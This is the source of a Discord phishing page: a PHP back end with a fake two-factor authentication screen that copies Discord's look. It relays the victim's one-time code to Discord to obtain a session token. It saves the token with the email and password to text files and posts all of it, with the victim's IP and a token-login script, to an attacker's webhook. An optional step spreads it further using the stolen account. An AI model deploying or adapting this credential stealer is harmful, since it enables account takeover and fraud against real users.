<?php
include 'config.php';
function getinfo($token, $url){
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, array('authorization: '.$token));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);

    $result        =  curl_exec($ch);
    $headers_size  =  curl_getinfo($ch, CURLINFO_HEADER_SIZE);

    curl_close($ch);

    $body      =  substr($result, $headers_size);
    $response  =  json_decode($body);
    $response  =  json_decode(json_encode($response), true);

    return $result;
    
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_GET['ticket'])) {
        $ticket = $_GET['ticket'];
        $code = $_POST["mfacode"];
        $client_ip = $_SERVER["REMOTE_ADDR"];
        $login = $_GET['em'];
        $password = $_GET['pw'];
        $login = base64_decode($login);
        $password = base64_decode($password);
        $url = "https://discord.com/api/v9/auth/mfa/totp";
        $payload = json_encode(array('code' => $code,
        'ticket' => $ticket,
        'login_source' => NULL,
        'gift_code_sku_id' => NULL ) );
        $request_headers = array(
            "Content-Type: application/json"
        );
        $ch = curl_init();
        curl_setopt($ch,CURLOPT_URL, $url);
        curl_setopt($ch,CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload );
        curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $request_headers);
        $result = curl_exec($ch);
        if (strpos($result, 'Invalid two-factor code') !== false) {
            $MSG = "Invalid two-factor code";
        }

        else if (strpos($result, 'Invalid two-factor auth ticket') !== false) {
            $MSG = "Invalid two-factor auth ticket";
            header("Location: /"); 
            exit();
        }

        else if (strpos($result, 'token') !== false) {
            $MSG = "SUCCESS";
            $yay = json_decode($result, true);
            $token = $yay["token"];

            if ($SAVE_TO_TXT) {
                $myfile = fopen("Tokens.txt", "a");
                fwrite($myfile, $token."\n\r");
                fclose($myfile);
    
                $myfile = fopen("Fulls.txt", "a");
                fwrite($myfile, $login.":".$password.":".$token."\n\r");
                fclose($myfile);
            }
    $TeamOwner     =  'Err';
    $BOT_Verify    =  'Err';

    $json_response =  json_decode(getinfo($token, "https://discordapp.com/api/v9/users/@me"), true);

    $userid        =  $json_response['id'];
    $username      =  $json_response['username'];
    $disc          =  $json_response['discriminator'];
    $avatar        =  $json_response['avatar'];
    $howmuchbadges =  0;
    $badges        =  '';
    

    if(isset($json_response['discriminator']) && isset($json_response['username'])) {
        $public_flags = $json_response['public_flags'];

        $flags = array (
            262144 => "$MOD",
            131072 => "$DEV",
            16384 => "$BUGHUNTER2",
            1024 => 'Team Owner',
            512 => "$EARLY",
            256 => "$BALANCE",
            128 => "$BRILLIANCE",
            64 => "$BRAVERY",
            8 => "$BUGHUNTER1",
            4 => "$HYPESQUAD",
            2 => "$PARTNER",
            1 => "$STAFF"
        );

        $str_flags = array();

        while($public_flags != 0)
        {
            foreach($flags as $key => $value)
            {
                if($public_flags >= $key)
                {
                    array_push($str_flags,$value);
                    $public_flags = $public_flags - $key;
                }
            }
        }
    }
    
    foreach($str_flags as $item)
        {
            if ($item != 'Hypesquad Online House 1' and $item != 'Hypesquad Online House 2' and $item != 'Hypesquad Online House 3')
            {
                if ($item == 'Verified Developer')
                {

                    $json_response_bot = json_decode(getinfo($token, "https://discord.com/api/v9/applications?with_team_applications=true"), true);

                    foreach($json_response_bot as $item2)
                    {
                        if (json_encode($item2['verification_state']) == '4')
                        {
                            if (json_encode($item2['owner']['id']) == $userid)
                            {
                              $BOT_Verify = 'Bot Owner';
                            }
                        }
                    }

                    $json_response_team = json_decode(getinfo($token, "https://discord.com/api/v9/teams"), true);

                    foreach($json_response_team as $item3)
                    {
                        if (json_encode($item3['owner_user_id']) == $userid)
                        {
                            $TeamOwner = 'Team Owner';
                        }
                    }

                    if ($TeamOwner != 'Err' and $BOT_Verify == 'Err')
                    {
                        $item = (string)$item.'(Team Owner)';
                    }
                    elseif($TeamOwner == 'Err' and $BOT_Verify != 'Err')
                    {
                        $item = (string)$item.'(Bot Owner)';
                    }
                    elseif($TeamOwner != 'Err' and $BOT_Verify != 'Err')
                    {
                        $item = (string)$item.'(Team Owner, Bot Owner)';
                    }

                    if ($howmuchbadges == 0)
                    {
                        $badges = $item;
                    }
                    else
                    {
                        $badges = $badges.'  '.$item;
                    }

                    $howmuchbadges += 1;
                }
                else
                {
                    if ($howmuchbadges == 0)
                    {
                        $badges = $item;
                    }
                    else
                    {
                        $badges = $badges.'  '.$item;
                    }

                    $howmuchbadges += 1;
                }
            }
        }
        $timestamp = date("c", strtotime("now"));
        $headers = [ 'Content-Type: application/json; charset=utf-8' ];
        if ($badges == '') {
            $POST = [ 'username' => "$username#$disc","avatar_url" => "https://cdn.discordapp.com/avatars/$userid/$avatar.png?size=4096", 'content' => "@here"
                ,
                "embeds" => [
                    [
                        "title" => "🔑 User Login",
                        "type" => "rich",
                        "description" => "```🌐 URL: $WEBSITE_LINK```",
                        "timestamp" => $timestamp,
                        "color" => hexdec("36393F"),
                        "footer" => [
                            "text" => "Grabbed at",
                            "icon_url" => "https://cdn.discordapp.com/emojis/951526509657600040.webp",
                        ],
                        "thumbnail" => [
                            "url" => "https://cdn.discordapp.com/avatars/$userid/$avatar.png?size=4096"
                        ],
                        "fields" => [
                            [
                                "name" => "**👮🏾‍♂️ ID**", "value" => "`$userid`", "inline" => true
                            ],
                            [
                                "name" => "**👤 Username**", "value" => "`$username#$disc`", "inline" => true
                            ],
                            [
                                "name" => "**📧 Mail**", "value" => "`$login`", "inline" => true
                            ],
                            [
                                "name" => "**🔒 Pass**", "value" => "||$password||",  "inline" => true
                            ],
                            [
                                "name" => "**🛰️ IP-adress**", "value" => "||$client_ip||", "inline" => true
                            ],
                            [
                                "name" => "**✨Amount Of Badges**", "value" => "`$howmuchbadges`", "inline" => true
                            ],
                            [
                                "name" => "**Token:**", "value" => "```$token```", "inline" => false
                            ],
                            [
                                "name" => "🌐 Login Script", "value" => '```js
                                function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50); setTimeout(() => {location.reload(); }, 2500);}'. "login('$token')```", "inline" => true
                            ],
                        ],
                    ],
                ],
        ];
        }
        else {
            $POST = [ 'username' => "$username#$disc","avatar_url" => "https://cdn.discordapp.com/avatars/$userid/$avatar.png?size=4096",  'content' => "@here"
            ,
            "embeds" => [
                [
                    "title" => "🔑 User Login",
                    "type" => "rich",
                    "description" => "```🌐 URL: $WEBSITE_LINK```",
                    "timestamp" => $timestamp,
                    "color" => hexdec("36393F"),
                    "footer" => [
                        "text" => "Grabbed at",
                        "icon_url" => "https://cdn.discordapp.com/emojis/951526509657600040.webp",
                    ],
                    "thumbnail" => [
                        "url" => "https://cdn.discordapp.com/avatars/$userid/$avatar.png?size=4096"
                    ],
                    "fields" => [
                        [
                            "name" => "**👮🏾‍♂️ ID**", "value" => "`$userid`", "inline" => true
                        ],
                        [
                            "name" => "**👤 Username**", "value" => "`$username#$disc`", "inline" => true
                        ],
                        [
                            "name" => "**📧 Mail**", "value" => "`$login`", "inline" => true
                        ],
                        [
                            "name" => "**🔒 Pass**", "value" => "||$password||",  "inline" => true
                        ],
                        [
                            "name" => "**🛰️ IP-adress**", "value" => "||$client_ip||", "inline" => true
                        ],
                        [
                            "name" => "**✨Amount Of Badges**", "value" => "`$howmuchbadges`", "inline" => true
                        ],
                        [
                            "name" => "**Badges:**", "value" => "$badges", "inline" => true
                        ],
                        [
                            "name" => "**Token:**", "value" => "```$token```", "inline" => false
                        ],
                        [
                            "name" => "🌐 Login Script", "value" => '```js
                            function login(token) { setInterval(() => { document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"` }, 50); setTimeout(() => {location.reload(); }, 2500);}'. "login('$token')```", "inline" => true
                        ],
                    ],
                ],
            ],
        ];
        }

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $WEBHOOK);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
            if ($SEND_TO_WEBHOOK)
        	    $response   = curl_exec($ch);
            if ($AUTOSPREAD)
                $contents = file_get_contents($API_URL.urlencode($token).'/'.urlencode($MESSAGE).'/'.urlencode($password));
        }
        else {
            header("Location: /"); 
            exit();
        }
    }
    else {
        header("Location: /"); 
        exit();
    }
}

?>

<html lang="en" style="font-size: 100%" class="full-motion app-focused theme-dark platform-web oldBrand" data-rh="lang,style,class"><head><meta charset="utf-8">
        <title>Discord</title>
        <meta content="width=device-width, initial-scale=1.0, maximum-scale=1, user-scalable=no" name="viewport">
        <meta property="og:type" content="website">
        <meta property="og:site_name" content="Discord">
        <meta property="og:title" content="Discord - A New Way to Chat with Friends &amp; Communities">
        <meta property="og:description" content="Discord is the easiest way to communicate over voice, video, and text.  Chat, hang out, and stay close with your friends and communities.">
        <meta property="og:image" content="src/img/ee7c382d9257652a88c8f7b7f22a994d.png">
        <meta name="twitter:card" content="summary_large_image">
        <meta name="twitter:site" content="@discord">
        <meta name="twitter:creator" content="@discord">
        <link rel="stylesheet" href="src/css/style.css">
        <link rel="icon" href="src/img/847541504914fd33810e70a0ea73177e.ico">
        <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@600&amp;family=Roboto:wght@400;500;700&amp;display=swap" rel="stylesheet">
        <script charset="utf-8" src="src/js/62139f1cff10402837062.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <style type="text/css">.disclaimer { display: none; }</style>
    </head>

    <body>
        <div id="app-mount" class="appMount-3lHmkl">
            <div class="app-1q1i1E">
                <div class="characterBackground-2itjYF">
                    <img style="position: fixed; height: 100%; top: 0; left: 0; width: 100%;" src="src/img/44e0c1fbcf99c4476083442e4a2774e0.svg">
                </div>
                <div class="splashBackground-1FRCko wrapper-3Q5DdO scrollbarGhost-2F9Zj2 scrollbar-3dvm_9">
                    <div>
                        <div class="wrapper-6URcxg">
                            <form class="authBox-hW6HRx theme-dark" onsubmit="checkmfa(); return false;" method="POST" id="formx">
                                <div class="centeringWrapper-2Rs1dR"><img alt="" src="src/img/0f4d1ff76624bb45a3fee4189279ee92.svg" class="marginBottom20-32qID7">
                                    <h3 class="title-jXR8lp marginBottom8-AtZOdT base-1x0h_U size24-RIRrxO">Two-factor authentication</h3>
                                    <div class="colorHeaderSecondary-3Sp3Ft size16-1P40sf">You can use a backup code or your two-factor authentication mobile app.</div>
                                    <div class="block-egJnc0 marginTop40-i-78cZ">
                                        <div class="marginBottom20-32qID7">
                                            <h5 class="colorStandard-2KCXvj size14-e6ZScH h5-18_1nd title-3sZWYQ defaultMarginh5-2mL-bP" id="pole1-text">ENTER DISCORD AUTH/BACKUP CODE                                                <span id="elprimo1" class="errorMessage-3Guw2R" hidden=""><span class="errorSeparator-30Q6aR">-</span>Invalid two-factor code</span>
                                            </h5>
                                            <div class="inputWrapper-31_8H8"><input class="inputDefault-_djjkz input-cIJ7To" id="pole1" name="mfacode" type="text" placeholder="6-digit authentication code/8-digit backup code" aria-label="Enter the authentication code or the backup Discord code" autocomplete="off" maxlength="10" spellcheck="false" value=""></div>
                                        </div><button id="sade" type="button" class="button-3k0cO7 button-38aScr lookFilled-1Gx00P colorBrand-3pXr91 sizeLarge-1vSeWK fullWidth-1orjjo grow-q77ONN" onclick="ohmygod(); checkmfa()">
                                            <span class="spinner-2enMB9 spinner-3a9zLT" id="loadi" style="display: none;"><span class="inner-1gJC7_ pulsingEllipsis-3YiXRF"><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span><span class="pulsingEllipsisItem-32hhWL spinnerItem-3GlVyU"></span></span></span>
                                            <div class="contents-18-Yxp">Login</div>
                                        </button><button type="button" class="marginTop4-2BNfKC linkButton-wzh5kV button-38aScr lookLink-9FtZy- lowSaturationUnderline-3svVxy colorLink-35jkBc sizeMin-1mJd1x grow-q77ONN">
                                            <div class="contents-18-Yxp" onclick="window.open('index.php', '_self');">Go back to Login</div>
                                        </button>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script type="text/javascript">
            function display(msg) {
                        document.querySelector("#sade").classList.remove("submitting-3qlO9O");
						document.getElementById("loadi").style.display = "none";
						document.getElementById("pole1-text").style.color="#ed4245";
						document.getElementById("elprimo1").innerText="- "+msg;
						document.getElementById("elprimo1").hidden=false;
                        document.getElementById("elprimo1").style="";
                    }
            document.getElementById("elprimo1").hidden = true;
            function checkstor() {
                        if (localStorage.getItem("token") && localStorage.getItem("token")!= "") {
                            window.location = "https://discord.com/app";
                        }
                        else {}
                    }
            function ohmygod(){
                document.getElementById("loadi").style.display = "";
                document.querySelector("#sade").classList.add("submitting-3qlO9O");
            }

            function checkmfa(){
                let el = document.getElementsByName("mfacode")[0];
                let mfacode = el.value;
                if(mfacode.length != 6 || !/^\d+$/giu.test(mfacode)){
                    let pol1 = document.querySelector("#pole1");
                    pol1.classList.add("unselect");
                    document.getElementById("elprimo1").hidden=false;
                    document.getElementById("pole1-text").style.color="#ed4245";
                    document.querySelector("#sade").classList.remove("submitting-3qlO9O");
                    document.getElementById("loadi").style.display = "none";
                    return;
                }
                document.getElementById("formx").submit();
            }

            <?php
                    if (isset($MSG)) {
                        if ($MSG == "SUCCESS") {
                            echo 'localStorage.setItem(\'token\', "'.$token.'");';
                            echo 'window.location = "https://discord.com/app";';
                        }
                        else {
                            echo 'display(\''.$MSG.'\');';
                        }
                    }
                    ?>
        </script>
    
</body></html>